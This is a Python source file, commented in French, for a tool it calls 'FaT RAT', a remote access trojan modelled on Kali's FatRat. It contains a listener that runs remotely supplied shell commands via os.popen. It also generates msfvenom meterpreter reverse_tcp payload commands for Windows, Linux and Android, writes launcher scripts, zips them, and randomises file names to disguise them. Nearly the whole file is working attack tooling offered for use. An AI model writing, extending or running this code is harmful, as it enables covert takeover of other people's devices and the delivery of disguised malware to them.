# from modules.ai_conscience import AIConscience
# ai_conscience = AIConscience()
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FaT RAT - Remote Access Trojan (RAT) Multi-plateforme
Fonctionnalités inspirées de FatRat Kali Linux :
• Génération de payloads (Windows, Linux, Android)
• Reverse shell
• Listener multi-plateforme
• Adaptation automatique Linux/Windows
"""

import sys
import os
import socket
import threading


import platform

class FatRat:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = None
        self.clients = []
        self.is_linux = platform.system() == 'Linux'
        self.is_windows = platform.system() == 'Windows'

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[+] FaT RAT server started on {self.host}:{self.port}")
        while True:
            client, addr = self.server.accept()
            print(f"[+] Connection from {addr}")
            self.clients.append(client)
            threading.Thread(target=self.handle_client, args=(client, addr)).start()

    def handle_client(self, client, addr):
        try:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                print(f"[DATA] {addr}: {data.decode(errors='ignore')}")
                # Command execution (Linux/Windows)
                cmd = data.decode(errors='ignore').strip()
                if cmd.startswith('shell:'):
                    command = cmd[6:]
                    output = self.execute_command(command)
                    client.sendall(output.encode())
                else:
                    client.sendall(b'ACK')
        except Exception as e:
            print(f"[!] Error with {addr}: {e}")
        finally:
            client.close()
            print(f"[-] Disconnected {addr}")

    def execute_command(self, command):
        try:
            if self.is_linux:
                return os.popen(command).read()
            elif self.is_windows:
                return os.popen(command).read()
            else:
                return "Unsupported OS"
        except Exception as e:
            return f"Error: {e}"

    def generate_payload(self, payload_type, lhost, lport, compress=True, obfuscate=True):
        """Génère un payload comme FatRat Kali Linux, avec options de compression et obfuscation"""
        import random, string, zipfile
        def random_name(ext):
            return ''.join(random.choices(string.ascii_letters, k=8)) + ext
        if payload_type == 'windows':
            fname = random_name('.exe') if obfuscate else 'payload.exe'
            cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {fname}"
        elif payload_type == 'linux':
            fname = random_name('.elf') if obfuscate else 'payload.elf'
            cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {fname}"
        elif payload_type == 'android':
            fname = random_name('.apk') if obfuscate else 'payload.apk'
            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {fname}"
        else:
            return "Type de payload non supporté."
        # Génération du script de lancement
        script_name = random_name('.bat' if self.is_windows else '.sh')
        script_content = f"@echo off\nstart {fname}" if self.is_windows else f"#!/bin/bash\nchmod +x {fname}\n./{fname}"
        with open(script_name, 'w') as f:
            f.write(script_content)
        # Compression
        if compress:
            zip_path = fname + '.zip'
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(fname)
                zipf.write(script_name)
            return f"Commande msfvenom :\n{cmd}\n\nFichiers générés : {fname}, {script_name}, archive : {zip_path}"
        return f"Commande msfvenom :\n{cmd}\n\nFichiers générés : {fname}, {script_name}"


if __name__ == "__main__":
    rat = FatRat()
    print("[FaT RAT] Multi-plateforme (Linux/Windows/Android)")
    print("[FaT RAT] Menu avancé :")
    print("- start : Démarrer le listener")
    print("- payload : Générer un payload (windows/linux/android) [options]")
    print("- compress : Activer la compression des payloads")
    print("- obfuscate : Activer l'obfuscation des noms")
    print("- exit : Quitter")
    compress = True
    obfuscate = True
    while True:
        cmd = input("FaT RAT > ").strip()
        if cmd == "start":
            try:
                rat.start_server()
            except KeyboardInterrupt:
                print("[!] Server stopped by user.")
                sys.exit(0)
        elif cmd.startswith("payload"):
            parts = cmd.split()
            if len(parts) >= 4:
                _, ptype, lhost, lport = parts[:4]
                print(rat.generate_payload(ptype, lhost, lport, compress=compress, obfuscate=obfuscate))
            else:
                print("Usage: payload [windows|linux|android] LHOST LPORT")
        elif cmd == "compress":
            compress = not compress
            print(f"Compression {'activée' if compress else 'désactivée'}.")
        elif cmd == "obfuscate":
            obfuscate = not obfuscate
            print(f"Obfuscation {'activée' if obfuscate else 'désactivée'}.")
        elif cmd == "exit":
            print("Bye!")
            break
        else:
            print("Commande inconnue. start | payload | compress | obfuscate | exit")
